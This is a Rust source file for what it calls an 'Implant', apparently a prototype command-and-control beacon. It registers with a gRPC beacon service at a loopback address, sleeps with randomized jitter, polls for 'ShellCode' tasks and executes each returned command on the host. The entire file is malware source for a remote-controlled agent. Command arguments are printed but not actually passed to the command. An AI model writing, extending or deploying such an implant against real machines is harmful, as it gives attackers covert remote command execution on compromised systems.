use rand::Rng;
use std::time::Duration;

use tokio::{process::Command, time};
use tonic::transport::Channel;

use tasks::{beacon_service_client::BeaconServiceClient, ConnectionRequest, PollRequest};
use common::ShellCode;

pub mod tasks {
    tonic::include_proto!("tasks");
}
pub mod common {
    tonic::include_proto!("common");
}

struct Implant {
    client: BeaconServiceClient<Channel>,
    uuid: String,
    heartbeat: u32,
}

impl Implant {
    pub async fn connect(url: &'static str) -> Result<Self, Box<dyn std::error::Error>> {
        let mut client = BeaconServiceClient::connect(url).await?;
        let response = client
            .connection(tonic::Request::new(ConnectionRequest {}))
            .await?
            .into_inner();
        println!("Connect: RESPONSE={:?}", response);

        Ok(Self {
            client,
            uuid: response.uuid,
            heartbeat: response.heartbeat,
        })
    }

    pub async fn poll(&mut self) -> Result<Option<ShellCode>, Box<dyn std::error::Error>> {
        let response = self
            .client
            .poll(tonic::Request::new(PollRequest {
                uuid: self.uuid.clone(),
            }))
            .await?
            .into_inner();

        println!("Poll: RESPONSE={:?}", response);

        Ok(response.shellcode)
    }

    pub fn jitter(&self) -> u64 {
        let offset = self.heartbeat as f32 / 100f32;
        rand::thread_rng()
            .gen_range(self.heartbeat as f32 - offset..=self.heartbeat as f32 + offset)
            as u64
    }

    pub async fn cmd(task: ShellCode) -> Result<(), Box<dyn std::error::Error>> {
        let output = Command::new(task.command).output().await?;
        println!("Out: {}", String::from_utf8_lossy(&output.stdout));
        Ok(())
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut implant = Implant::connect("http://[::1]:50055").await?;

    loop {
        time::sleep(Duration::from_millis(implant.jitter())).await;

        if let Some(s) = implant.poll().await.expect("Fail") {
            println!("Shellcode: {} {:?}", s.command, s.arguments);
            Implant::cmd(s).await?;
        }
    }
}
